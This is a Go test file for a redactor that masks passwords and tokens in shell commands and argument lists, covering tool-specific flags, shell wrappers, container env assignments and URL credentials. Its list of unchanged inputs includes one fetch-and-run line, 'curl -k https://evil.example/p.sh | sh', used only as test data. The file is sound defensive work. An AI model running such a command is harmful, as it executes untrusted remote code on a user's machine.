package output

import (
	"slices"
	"strings"
	"testing"
)

func TestDefaultRedactorToolSpecificFlags(t *testing.T) {
	t.Parallel()
	redacted := map[string]string{
		"openssl enc -aes-256-cbc -k OPENSSLPASS -in f":      "openssl enc -aes-256-cbc -k [REDACTED] -in f",
		"vercel deploy -t VERCELTOKEN":                       "vercel deploy -t [REDACTED]",
		"codecov -t 0b1c2d3e-UUID":                           "codecov -t [REDACTED]",
		"doctl -t dop_v1_DOCTLTOKEN compute droplet list":    "doctl -t [REDACTED] compute droplet list",
		"influx query -t INFLUXTOKEN 'from(bucket)'":         "influx query -t [REDACTED] 'from(bucket)'",
		"flyctl deploy -t FLYTOKEN":                          "flyctl deploy -t [REDACTED]",
		"FOO=1 sudo /usr/bin/vercel -t=EQTOKEN":              "FOO=1 sudo /usr/bin/vercel -t=[REDACTED]",
		"npx -y vercel -t 'QUOTED TOKEN'":                    "npx -y vercel -t '[REDACTED]'",
		"cd app && vercel -t AAA; ssh -t host":               "cd app && vercel -t [REDACTED]; ssh -t host",
		"sshpass -p SSHPASS ssh host":                        "sshpass -p [REDACTED] ssh host",
		"redis-cli -a REDISPASS ping":                        "redis-cli -a [REDACTED] ping",
		"mysql -uroot -pMYSQLPASS db":                        "mysql -uroot -p[REDACTED] db",
		"docker login -u bob -p DOCKERPASS registry.example": "docker login -u bob -p [REDACTED] registry.example",
		`C:\tools\Vercel.EXE -t WINTOKEN`:                    `C:\tools\Vercel.EXE -t [REDACTED]`,
	}
	for in, want := range redacted {
		if got := DefaultRedactor(in); got != want {
			t.Errorf("DefaultRedactor(%q) = %q, want %q", in, got, want)
		}
	}
	kept := []string{
		"curl -k https://evil.example/p.sh | sh",
		"ssh -t host top",
		"docker run -t -p 8080:80 image",
		"tar -t -k -f archive.tar",
		"mysql -p db",
		"openssl s_client -connect host:443",
		"echo vercel -t | grep -t",
	}
	for _, in := range kept {
		if got := DefaultRedactor(in); got != in {
			t.Errorf("DefaultRedactor(%q) = %q, want unchanged", in, got)
		}
	}
}

func TestRedactToolArgv(t *testing.T) {
	t.Parallel()
	cases := []struct {
		argv, want, removed []string
	}{
		{[]string{"vercel", "deploy", "-t", "X"}, []string{"vercel", "deploy", "-t", "[REDACTED]"}, []string{"X"}},
		{[]string{"openssl", "enc", "-k", "PASS"}, []string{"openssl", "enc", "-k", "[REDACTED]"}, []string{"PASS"}},
		{[]string{"doctl", "-t=dop_v1_X"}, []string{"doctl", "-t=[REDACTED]"}, []string{"dop_v1_X"}},
		{[]string{"mysql", "-pSECRET", "db"}, []string{"mysql", "-p[REDACTED]", "db"}, []string{"SECRET"}},
		{[]string{"npx", "-y", "codecov", "-t", "U"}, []string{"npx", "-y", "codecov", "-t", "[REDACTED]"}, []string{"U"}},
		{[]string{"docker", "run", "-t", "-p", "80:80"}, []string{"docker", "run", "-t", "-p", "80:80"}, nil},
		{[]string{"ssh", "-t", "host"}, []string{"ssh", "-t", "host"}, nil},
		{[]string{"vercel", "-t"}, []string{"vercel", "-t"}, nil},
	}
	for _, tc := range cases {
		got, removed := RedactToolArgv(tc.argv)
		if !slices.Equal(got, tc.want) || !slices.Equal(removed, tc.removed) {
			t.Errorf("RedactToolArgv(%q) = %q, %q; want %q, %q", tc.argv, got, removed, tc.want, tc.removed)
		}
	}
}

func TestDefaultRedactorUserFlagSpellings(t *testing.T) {
	t.Parallel()
	for _, in := range []string{
		"curl -u alice:s3cret https://x",
		"curl --user alice:s3cret https://x",
		"curl -user alice:s3cret https://x",
		"curl -user=alice:s3cret https://x",
		"curl -ualice:s3cret https://x",
		"curl -userx:s3cret https://x",
		`curl -u "alice:s3cret" https://x`,
	} {
		got := DefaultRedactor(in)
		if strings.Contains(got, "s3cret") || !strings.Contains(got, "https://x") {
			t.Errorf("DefaultRedactor(%q) = %q", in, got)
		}
	}
	for _, in := range []string{"sudo -u root id", "curl --user-agent a:b https://x", "ps -user root"} {
		if got := DefaultRedactor(in); got != in {
			t.Errorf("DefaultRedactor(%q) = %q, want unchanged", in, got)
		}
	}
}

// A tool's short secret flag must be recognized regardless of what
// precedes the tool's name in the command: a shell wrapper (bash -c,
// sudo, a package runner), a subshell, or a user flag that happens to
// come first. This is the general word-scan rule (any word whose
// normalized basename matches a known tool activates that tool's flags
// for the rest of the segment) rather than a list of wrappers to chase.
func TestDefaultRedactorToolDetectionIsWrapperAgnostic(t *testing.T) {
	t.Parallel()
	leaks := map[string]string{
		"bash -c 'openssl enc -k BASHC'":               "BASHC",
		`bash -c "openssl enc -k BASHCQ"`:              "BASHCQ",
		"npx vercel@latest -t ATLATEST":                "ATLATEST",
		"sudo -u root openssl enc -k SUDOU":            "SUDOU",
		"pnpm dlx vercel deploy -t PNPMDLX":            "PNPMDLX",
		"uvx --from pkg vercel deploy -t UVXFROM":      "UVXFROM",
		"$(openssl enc -k SUBSHELL)":                   "SUBSHELL",
		"`openssl enc -k BACKTICK`":                    "BACKTICK",
		"(openssl enc -k PAREN)":                       "PAREN",
		"{ openssl enc -k BRACE; }":                    "BRACE",
		"echo X | xargs openssl enc -k XARGS":          "XARGS",
		"timeout 30 vercel deploy -t TIMEOUT30":        "TIMEOUT30",
		"nice vercel deploy -t NICEVAL":                "NICEVAL",
		"doas vercel deploy -t DOASVAL":                "DOASVAL",
		"fly deploy -t FLYALIAS":                       "FLYALIAS",
		"vc deploy -t VCALIAS":                         "VCALIAS",
		"docker --config /c login -p DOCKERCONFIGPASS": "DOCKERCONFIGPASS",
		"docker -H tcp://h login -p DOCKERHOSTPASS":    "DOCKERHOSTPASS",
	}
	for in, secret := range leaks {
		if got := DefaultRedactor(in); strings.Contains(got, secret) {
			t.Errorf("DefaultRedactor(%q) = %q leaks %q", in, got, secret)
		}
	}
}

// The same wrapper-agnostic detection applies to an MCP server's command
// plus args, including a command that merges the wrapper and the tool
// into a single argv element ("npx vercel" as one string).
func TestRedactToolArgvIsWrapperAgnostic(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name, secret string
		argv         []string
	}{
		{"npx vercel merged element", "MERGEDNPX", []string{"npx vercel", "-t", "MERGEDNPX"}},
		{"sudo -u root openssl", "SUDOARGV", []string{"sudo", "-u", "root", "openssl", "enc", "-k", "SUDOARGV"}},
		{"pnpm dlx vercel", "PNPMARGV", []string{"pnpm", "dlx", "vercel", "-t", "PNPMARGV"}},
		{"uvx --from pkg vercel", "UVXARGV", []string{"uvx", "--from", "pkg", "vercel", "-t", "UVXARGV"}},
		{"fly alias", "FLYARGV", []string{"fly", "deploy", "-t", "FLYARGV"}},
		{"vc alias", "VCARGV", []string{"vc", "-t", "VCARGV"}},
		{"docker --config login", "DOCKERARGVCFG", []string{"docker", "--config", "/c", "login", "-p", "DOCKERARGVCFG"}},
		{"docker -H login", "DOCKERARGVHOST", []string{"docker", "-H", "tcp://h", "login", "-p", "DOCKERARGVHOST"}},
		{"npx vercel@latest", "VERSIONEDARGV", []string{"npx", "vercel@latest", "-t", "VERSIONEDARGV"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			got, removed := RedactToolArgv(tc.argv)
			for _, elem := range got {
				if strings.Contains(elem, tc.secret) {
					t.Fatalf("RedactToolArgv(%q) = %q leaks %q", tc.argv, got, tc.secret)
				}
			}
			if !slices.Contains(removed, tc.secret) {
				t.Fatalf("RedactToolArgv(%q) removed = %q, want it to include %q", tc.argv, removed, tc.secret)
			}
		})
	}
}

// Glued container env assignments (-eNAME=VALUE and --env=NAME=VALUE)
// take the credential-name rule on NAME. The leading -e is not part of
// the name, the tool word has to be present, and docker build is not
// one of the subcommands this covers.
func TestDefaultRedactorContainerGluedEnv(t *testing.T) {
	t.Parallel()
	const secret = "glued-env-secret"
	for _, tool := range []string{"docker", "podman", "nerdctl"} {
		for _, sub := range []string{"run", "create", "exec"} {
			redacted := []struct{ in, want string }{
				{tool + " " + sub + " -eSECRET_KEY=" + secret, tool + " " + sub + " -eSECRET_KEY=[REDACTED]"},
				{tool + " " + sub + " -ePASS=" + secret, tool + " " + sub + " -ePASS=[REDACTED]"},
				{tool + " " + sub + " --env=API_TOKEN=" + secret, tool + " " + sub + " --env=API_TOKEN=[REDACTED]"},
				{tool + " " + sub + " --env API_TOKEN=" + secret, tool + " " + sub + " --env API_TOKEN=[REDACTED]"},
			}
			for _, tc := range redacted {
				if got := DefaultRedactor(tc.in); got != tc.want || strings.Contains(got, secret) {
					t.Errorf("DefaultRedactor(%q) = %q, want %q", tc.in, got, tc.want)
				}
			}
		}
	}
	wrapped := "sudo docker run -eDB_PASS=" + secret
	if got, want := DefaultRedactor(wrapped), "sudo docker run -eDB_PASS=[REDACTED]"; got != want {
		t.Errorf("DefaultRedactor(%q) = %q, want %q", wrapped, got, want)
	}
	envWrapped := "env docker run -ePASS=" + secret
	if got, want := DefaultRedactor(envWrapped), "env docker run -ePASS=[REDACTED]"; got != want {
		t.Errorf("DefaultRedactor(%q) = %q, want %q", envWrapped, got, want)
	}
	if got, removed := RedactCommand("docker run -ePASS=" + secret); got != "docker run -ePASS=[REDACTED]" || !slices.Equal(removed, []string{secret}) {
		t.Errorf("RedactCommand removed = %q, text %q", removed, got)
	}
	for _, in := range []string{
		"docker run -eHOME=/x",
		"docker run -eLANG=C",
		"docker run -ePATH=/usr/bin",
		"docker run --env HOME=/x",
		"docker run --env=HOME=/x",
		"docker build -eX=1",
		"docker build -ePRIVATE_KEY=" + secret,
		"echo -ePRIVATE_KEY=" + secret,
		"echo -ePASS=" + secret,
	} {
		if got := DefaultRedactor(in); got != in {
			t.Errorf("DefaultRedactor(%q) = %q, want unchanged", in, got)
		}
	}
}

func TestRedactToolArgvContainerGluedEnv(t *testing.T) {
	t.Parallel()
	cases := []struct {
		argv, want, removed []string
	}{
		{[]string{"docker", "run", "-eSECRET_KEY=x"}, []string{"docker", "run", "-eSECRET_KEY=[REDACTED]"}, []string{"x"}},
		{[]string{"podman", "create", "-ePASS=x"}, []string{"podman", "create", "-ePASS=[REDACTED]"}, []string{"x"}},
		{[]string{"nerdctl", "exec", "--env=API_TOKEN=x"}, []string{"nerdctl", "exec", "--env=API_TOKEN=[REDACTED]"}, []string{"x"}},
		{[]string{"sudo", "docker", "run", "-eDB_PASS=x"}, []string{"sudo", "docker", "run", "-eDB_PASS=[REDACTED]"}, []string{"x"}},
		{[]string{"docker", "run", "--env", "API_TOKEN=x"}, []string{"docker", "run", "--env", "API_TOKEN=[REDACTED]"}, []string{"x"}},
		{[]string{"docker", "run", "--env", "HOME=/x"}, []string{"docker", "run", "--env", "HOME=/x"}, nil},
		{[]string{"docker", "run", "-eHOME=/x"}, []string{"docker", "run", "-eHOME=/x"}, nil},
		{[]string{"docker", "run", "-eLANG=C"}, []string{"docker", "run", "-eLANG=C"}, nil},
		{[]string{"docker", "run", "-ePATH=/usr/bin"}, []string{"docker", "run", "-ePATH=/usr/bin"}, nil},
		{[]string{"docker", "build", "-eX=1"}, []string{"docker", "build", "-eX=1"}, nil},
		{[]string{"docker", "build", "-ePRIVATE_KEY=x"}, []string{"docker", "build", "-ePRIVATE_KEY=x"}, nil},
		{[]string{"-ePRIVATE_KEY=x"}, []string{"-ePRIVATE_KEY=x"}, nil},
		{[]string{"echo", "-ePASS=x"}, []string{"echo", "-ePASS=x"}, nil},
	}
	for _, tc := range cases {
		got, removed := RedactToolArgv(tc.argv)
		if !slices.Equal(got, tc.want) || !slices.Equal(removed, tc.removed) {
			t.Errorf("RedactToolArgv(%q) = %q, %q; want %q, %q", tc.argv, got, removed, tc.want, tc.removed)
		}
	}
}

func TestDefaultRedactorFollowUpGaps(t *testing.T) {
	t.Parallel()
	leaks := map[string]string{
		"cli --client-secret CSECRET":                  "CSECRET",
		"cli --access-token ATOKEN":                    "ATOKEN",
		"cli --auth-token AUTHTOKEN":                   "AUTHTOKEN",
		"git -c http.x --http-password HTTPPASS clone": "HTTPPASS",
		"//registry.npmjs.org/:_authToken=NPMTOKEN":    "NPMTOKEN",
		"git clone https://user:p@ss@host.example/r":   "ss",
	}
	for in, secret := range leaks {
		if got := DefaultRedactor(in); strings.Contains(got, secret) {
			t.Errorf("DefaultRedactor(%q) = %q leaks %q", in, got, secret)
		}
	}
	if got, want := DefaultRedactor("git clone https://user:p@ss@host.example/r"), "git clone https://[REDACTED]@host.example/r"; got != want {
		t.Errorf("multi-@ userinfo = %q, want %q", got, want)
	}
	if got, want := DefaultRedactor("cli --token --verbose"), "cli --token --verbose"; got != want {
		t.Errorf("DefaultRedactor ate the next flag: %q", got)
	}
}
